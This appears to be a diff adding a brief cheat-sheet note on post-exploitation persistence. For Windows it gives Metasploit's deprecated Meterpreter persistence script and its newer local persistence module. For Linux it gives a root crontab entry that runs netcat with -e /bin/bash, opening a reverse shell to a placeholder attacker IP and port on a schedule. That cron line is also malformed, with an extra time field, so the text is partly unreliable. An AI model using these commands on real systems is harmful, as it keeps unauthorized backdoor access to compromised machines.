@@ -1,0 +1,19 @@
+== Metasploit Persistence ==
+
+A way to stay there.
+
+Automatic persistence script (deprecated):
+
+	meterpreter> run persistence -h
+
+	this has to run from meterpreter!
+
+New way:
+	msf> use exploit/windows/local/persistence
+
+== Linux==
+Juse use crontab:
+
+* 10 * * * * root nc <IP> <Port> -e /bin/bash
+
+
